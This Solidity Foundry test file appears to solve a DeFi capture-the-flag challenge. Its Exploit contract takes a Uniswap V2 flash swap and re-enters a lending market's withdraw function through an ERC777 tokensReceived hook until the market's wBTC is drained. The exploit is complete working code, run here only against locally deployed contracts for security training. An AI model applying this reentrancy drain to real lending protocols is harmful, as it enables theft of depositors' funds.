// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IWETH} from "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import {Token} from "src/other/Token.sol";
import {Token777} from "src/other/Token777.sol";
import {IERC1820Registry} from "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
import {IMoneyMarket} from "src/safu-lender/IMoneyMarket.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    address admin = makeAddr('admin'); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    IUniswapV2Factory uniFactory;
    IUniswapV2Router02 uniRouter;
    IUniswapV2Pair usdcBtcPair;
    IWETH weth;
    Token usdc;
    Token777 wbtc;
    IERC1820Registry erc1820Registry;
    IMoneyMarket moneyMarket;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying ERC1820Registry contract at 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24
        address ERC1820Deployer = 0xa990077c3205cbDf861e17Fa532eeB069cE9fF96;

        vm.prank(ERC1820Deployer);
        erc1820Registry = IERC1820Registry(
            deployCode("out/ERC1820Registry.sol/ERC1820Registry.json")
        );

        // deploying token contracts
        vm.prank(admin);
        usdc = new Token('USDC','USDC');
        vm.prank(admin);
        usdc.mint(admin,2_000_000e18);

        address[] memory addresses = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        vm.prank(admin);
        wbtc = new Token777('wBTC','wBTC',addresses);

        addresses[0]=admin; addresses[1]=adminUser;
        amounts[0]=2_000e18; amounts[1]=1_000e18;
        vm.prank(admin);
        wbtc.mintPerUser(addresses,amounts);

        // deploying uniswap contracts
        weth = IWETH(
            deployCode("src/other/uniswap-build/WETH9.json")
        );
        uniFactory = IUniswapV2Factory(
            deployCode(
                "src/other/uniswap-build/UniswapV2Factory.json",
                abi.encode(admin)
            )
        );
        uniRouter = IUniswapV2Router02(
            deployCode(
                "src/other/uniswap-build/UniswapV2Router02.json",
                abi.encode(address(uniFactory),address(weth))
            )
        );

        // --adding initial liquidity
        vm.prank(admin);
        usdc.approve(address(uniRouter),type(uint).max);
        vm.prank(admin);
        wbtc.approve(address(uniRouter),type(uint).max);

        vm.prank(admin);
        uniRouter.addLiquidity( // USDC-wBTC pair
            address(usdc),address(wbtc),
            2_000_000e18,2_000e18,
            0,0,
            admin,block.timestamp
        );

        usdcBtcPair = IUniswapV2Pair(uniFactory.getPair(address(usdc),address(wbtc)));

        // deploying core contracts
        vm.prank(admin);
        moneyMarket = IMoneyMarket(
            deployCode("out/MoneyMarket.sol/MoneyMarket.json")
        );

        vm.prank(admin);
        moneyMarket._supportMarket(address(wbtc));

        vm.prank(adminUser);
        wbtc.approve(address(moneyMarket),type(uint).max);
        vm.prank(adminUser);
        moneyMarket.supply(address(wbtc),1_000e18);

    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker,attacker);

        // implement solution here
        Exploit exploit = new Exploit(address(wbtc),address(moneyMarket),address(usdcBtcPair));
        exploit.pwn();

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker drains at least 99% of the wBTC from MoneyMarket
        assertGe(wbtc.balanceOf(attacker),990e18);
        assertLe(wbtc.balanceOf(address(moneyMarket)),10e18);

    }

}

contract Exploit{
    
    address owner;
    IUniswapV2Pair usdcBtcPair;
    IWETH weth;
    Token usdc;
    Token777 wbtc;
    IMoneyMarket moneyMarket;

    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");


    constructor(address _wbtc, address _moneyMarket, address _usdcBtcPair ){
        owner = msg.sender;
        wbtc = Token777(_wbtc);
        moneyMarket = IMoneyMarket(_moneyMarket);
        usdcBtcPair = IUniswapV2Pair(_usdcBtcPair);
        wbtc.approve(address(moneyMarket),type(uint).max);
        wbtc.approve(address(usdcBtcPair),type(uint).max);
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), _TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
    }

    function uniswapV2Call(address _address,uint amount0Out,uint amount1Out, bytes memory data) external {
        uint256 wbtcAmount = wbtc.balanceOf(address(this));
        console.log("balance wbtc of exploit : ",wbtcAmount);
        
        moneyMarket.supply(address(wbtc),amount1Out);

        moneyMarket.withdraw(address(wbtc),amount1Out);
        

        
        console.log("balance wbtc of exploit : ",wbtc.balanceOf(address(this)));
        console.log("amount to repay : ",(amount1Out * 103 /100)+1);//yeah the premium is a bit to high

        wbtc.transfer(address(usdcBtcPair), (amount1Out * 103 /100)+1);
        wbtc.transfer(owner, wbtc.balanceOf(address(this)));
        console.log("balance wbtc of attacker : ",wbtc.balanceOf(address(owner)));
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external{
        if(wbtc.balanceOf(address(moneyMarket)) >= 1e18 ) {
            console.log("balance wbtc of attacker : ",wbtc.balanceOf(address(owner)));
            moneyMarket.withdraw(address(wbtc),amount);
        }
    }
    function pwn() external {
        usdcBtcPair.swap(0,10e18,address(this), new bytes(1));
    }
}